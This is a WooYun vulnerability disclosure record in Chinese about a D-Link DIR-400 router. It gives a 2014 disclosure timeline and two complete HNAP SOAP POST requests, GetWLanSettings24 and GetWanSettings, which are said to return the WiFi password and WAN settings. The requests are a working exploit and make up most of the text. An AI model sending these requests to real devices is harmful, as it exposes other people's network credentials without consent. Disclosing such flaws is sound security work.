wybug_title: D-Link某款路由发送特定POST包可获取WIFI密码等信息
wybug_status: 已交由第三方合作机构(cncert国家互联网应急中心)处理
wybug_detail:
漏洞详情 披露状态：   									2014-07-04：	细节已通知厂商并且等待厂商处理中									2014-07-09：	厂商已经确认，细节仅向厂商公开									2014-07-12：	细节向第三方安全合作伙伴开放									2014-09-02：	细节向核心白帽子及相关领域专家公开									2014-09-12：	细节向普通白帽子公开									2014-09-22：	细节向实习白帽子公开									2014-10-02：	细节向公众公开  简要描述： D-Link某款路由发送特定POST包可获取WIFI密码等信息 详细说明：  型号：DIR-400
POST /HNAP1/ HTTP/1.0Connection: keep-aliveContent-Length: 337SOAPAction: "http://purenetworks.com/HNAP1/GetWLanSettings24"Host: 地址:8080Accept: text/html, */*Accept-Encoding: deflate, gzip, identityUser-Agent: Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1<?xml version="1.0" encoding="utf-8"?><soap:Envelopexmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"xmlns:xsd="http://www.w3.org/2001/XMLSchema"xmlns:soap="http://schemas.xmlsoap.org/soap/encoding/">	<soap:Body>		<GetWLanSettings24 xmlns="http://purenetworks.com/HNAP1/">		</GetWLanSettings24>	</soap:Body></soap:Envelope>

POST /HNAP1/ HTTP/1.0Connection: keep-aliveContent-Length: 331SOAPAction: "http://purenetworks.com/HNAP1/GetWanSettings"Host: 地址:8080Accept: text/html, */*Accept-Encoding: deflate, gzip, identityUser-Agent: Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1<?xml version="1.0" encoding="utf-8"?><soap:Envelopexmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"xmlns:xsd="http://www.w3.org/2001/XMLSchema"xmlns:soap="http://schemas.xmlsoap.org/soap/encoding/">	<soap:Body>		<GetWanSettings xmlns="http://purenetworks.com/HNAP1/">		</GetWanSettings>	</soap:Body></soap:Envelope>
